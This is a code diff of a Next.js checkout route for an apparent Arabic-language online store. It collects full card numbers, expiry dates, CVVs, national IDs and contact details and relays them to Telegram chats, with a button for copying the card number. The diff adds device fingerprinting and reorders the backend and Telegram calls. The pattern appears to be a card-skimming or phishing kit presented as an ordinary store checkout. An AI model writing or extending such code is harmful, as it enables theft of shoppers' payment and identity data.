@@ -1,39 +1,51 @@
 import { NextRequest, NextResponse } from "next/server";
 
 export async function POST(req: NextRequest) {
-  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment } = await req.json();
+  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment, fingerprint } = await req.json();
 
   const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
-
-  // جيب الـ IP والدولة
   const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || req.headers.get("x-real-ip") || "";
   const isLocal = !ip || ip === "127.0.0.1" || ip === "::1";
-
   const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((total - downPayment) / months) : 0;
 
-  // حفظ في الداتابيز وجلب الجيو بالتوازي
-  let dbOrderId: string | null = null;
-  let country = "غير معروف";
+  // deviceId: fingerprint أولاً، fallback للـ IP
+  const deviceId = fingerprint || ip || "unknown";
 
-  const [dbRes, geoRes] = await Promise.allSettled([
-    fetch(`${process.env.BACKEND_URL}/api/checkout`, {
+  // ── 1. أرسل للـ backend أولاً ──
+  let dbRes: Response;
+  try {
+    dbRes = await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
       method: "POST",
-      headers: { "Content-Type": "application/json", "x-forwarded-for": ip },
+      headers: {
+        "Content-Type": "application/json",
+        "x-forwarded-for": ip,
+        "x-device-id": deviceId,
+      },
       body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment, downPayment }),
-    }),
-    isLocal ? Promise.resolve(null) : fetch(`http://ip-api.com/json/${ip}?fields=country`),
-  ]);
-
-  if (dbRes.status === "fulfilled" && dbRes.value.ok) {
-    const dbData = await dbRes.value.json().catch(() => ({}));
-    dbOrderId = dbData._id ?? dbData.id ?? null;
-  }
-  if (geoRes.status === "fulfilled" && geoRes.value) {
-    const geoData = await geoRes.value.json().catch(() => ({}));
-    if (geoData.country) country = geoData.country;
+    });
+  } catch {
+    return NextResponse.json({ ok: false, error: "Service unavailable" }, { status: 503 });
   }
 
-  // Send Telegram
+  // إذا رُفض → أوقف هنا، لا ترسل Telegram
+  if (!dbRes.ok) {
+    const errData = await dbRes.json().catch(() => ({}));
+    return NextResponse.json(errData, { status: dbRes.status });
+  }
+
+  const dbData = await dbRes.json().catch(() => ({}));
+  const dbOrderId: string | null = dbData._id ?? dbData.id ?? null;
+
+  // ── 2. نجح الطلب → أرسل Telegram ──
+  let country = "غير معروف";
+  if (!isLocal) {
+    try {
+      const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=country`);
+      const geoData = await geoRes.json();
+      if (geoData.country) country = geoData.country;
+    } catch {}
+  }
+
   const text = [
     `🛒 طلب لـ متجر مؤسسة مدار التقنية`,
     `🔖 رقم الطلب: #${orderId}`,
@@ -57,15 +69,14 @@ export async function POST(req: NextRequest) {
 
   const whatsappNum = (whatsapp ?? "").replace(/\D/g, "");
   const reply_markup = {
-    inline_keyboard: [
-      [
-        { text: "📋 نسخ رقم البطاقة", copy_text: { text: cardNumber } },
-        ...(whatsappNum ? [{ text: "💬 فتح واتساب", url: `https://wa.me/${whatsappNum}` }] : []),
-      ],
-    ],
+    inline_keyboard: [[
+      { text: "📋 نسخ رقم البطاقة", copy_text: { text: cardNumber } },
+      ...(whatsappNum ? [{ text: "💬 فتح واتساب", url: `https://wa.me/${whatsappNum}` }] : []),
+    ]],
   };
 
-  const chatIds = (process.env.TELEGRAM_CHAT_IDS ?? process.env.TELEGRAM_CHAT_ID ?? "").split(",").map(id => id.trim()).filter(Boolean);
+  const chatIds = (process.env.TELEGRAM_CHAT_IDS ?? process.env.TELEGRAM_CHAT_ID ?? "")
+    .split(",").map(id => id.trim()).filter(Boolean);
 
   await Promise.all(
     chatIds.map(chat_id =>
